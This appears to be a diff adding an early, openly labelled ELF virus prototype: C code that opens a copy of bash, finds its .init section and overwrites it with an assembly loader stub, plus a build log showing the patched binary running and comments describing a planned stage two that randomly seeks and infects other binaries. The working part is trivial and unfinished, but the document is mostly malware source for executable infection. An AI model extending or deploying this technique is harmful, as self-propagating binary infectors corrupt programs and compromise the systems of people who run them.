@@ -1,0 +1,120 @@
+/*[madmouse@malware elfinfector]$ make
+gcc -masm=intel -m64 -std=gnu99 -o yay yay.c
+nasm -f elf64 -o payload.o payload.s
+gcc -masm=intel -m64 -std=gnu99 -fpic -o elfinfector elfinfector.c payload.o
+chmod +x elfinfector
+cp /bin/bash ./
+# bash pre infection
+echo 'ps $$\nexit' | ./bash
+  PID TTY      STAT   TIME COMMAND
+14305 pts/0    S+     0:00 ./bash
+# injecting bash
+./elfinfector
+.init: offset: 1d570, size: 26
+# bash post infection
+echo 'ps $$\nexit' | ./bash
+  PID TTY      STAT   TIME COMMAND
+14312 pts/0    S+     0:00 X/bash
+[madmouse@malware elfinfector]$
+
+*/
+
+////////////////////////////////////////////////////////////////////////////////
+// THE SCOTCH-WARE LICENSE (Revision 0):
+// <aaronryool/gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a shot of scotch in return
+////////////////////////////////////////////////////////////////////////////////
+//
+// The idea is basically to hijack the .init section, use the 27 bytes of
+// __init for the first stage loader, which will set up the environment for stage
+//  two, which will save the state of the program entry, randomly search for a 
+// binary to latch onto, infect a random compatible binary, and then clean up, 
+// restore the entry state, jmp into a reimplementation of __init, and continue
+// normal program execution...
+
+
+#include <string.h>
+#include <malloc.h>
+#include <stdio.h>
+#include <elf.h>
+
+typedef struct target {
+    Elf64_Ehdr* eheader;
+    Elf64_Shdr* sheader;
+    Elf64_Phdr* pheader;
+    char* shstable;
+} target_t;
+
+
+// code in payload.s
+extern const void* loader;
+
+int main(int argc, char** argv)
+{
+    target_t target;
+
+    // open test binary
+    FILE* file = fopen("./bash", "rw+");
+
+    // read in its elf header
+    target.eheader = malloc(sizeof(Elf64_Ehdr));
+    fread(target.eheader, sizeof(Elf64_Ehdr), 1, file);
+
+    // see to section header offset
+    fseek(file, target.eheader->e_shoff, SEEK_SET);
+
+    // read in section header
+    target.sheader = malloc(sizeof(Elf64_Shdr) * target.eheader->e_shnum);
+    fread(target.sheader, sizeof(Elf64_Shdr), target.eheader->e_shnum, file);
+
+
+    // read in section header string table section header entry
+    Elf64_Shdr* stsh = target.sheader + target.eheader->e_shstrndx;
+
+    // seek to the string table itself
+    fseek(file, stsh->sh_offset, SEEK_SET);
+
+    // read in the section header strings table
+    target.shstable = malloc(stsh->sh_size);
+    fread(target.shstable, stsh->sh_size, 1, file);
+
+    // search for the ".init" section
+    for(int i = 0;i < target.eheader->e_shnum;i++, target.sheader++)
+    {
+        char* name = target.shstable + target.sheader->sh_name;
+        if(strcmp(name, ".init") == 0)
+        {
+            // rudely shove the loader into .init, and print out stuff about it
+            fseek(file, target.sheader->sh_offset, SEEK_SET);
+            fwrite(&loader, 1, 8, file);
+        }
+    }
+    // seek to end of file
+    fseek(file, 0, SEEK_END);
+
+    // write the stage two object to the end of the file, and prepare it for its new host
+
+    return 0;
+}
+
+
+
+; payload.s
+[bits 64]
+
+global loader
+loader:
+    mov rsi, qword [rsi]
+    mov byte [rsi], 'X'
+    ret
+
+; what it was:
+;00000000004003a8 <_init>:
+;  4003a8:	48 83 ec 08          	sub    $0x8,%rsp
+;  4003ac:	48 8b 05 3d 05 20 00 	mov    0x20053d(%rip),%rax        # 6008f0 <_DYNAMIC+0x1d0>
+;  4003b3:	48 85 c0             	test   %rax,%rax
+;  4003b6:	74 05                	je     4003bd <_init+0x15>
+;  4003b8:	e8 43 00 00 00       	callq  400400 <__gmon_start__@plt>
+;  4003bd:	48 83 c4 08          	add    $0x8,%rsp
+;  4003c1:	c3                   	retq
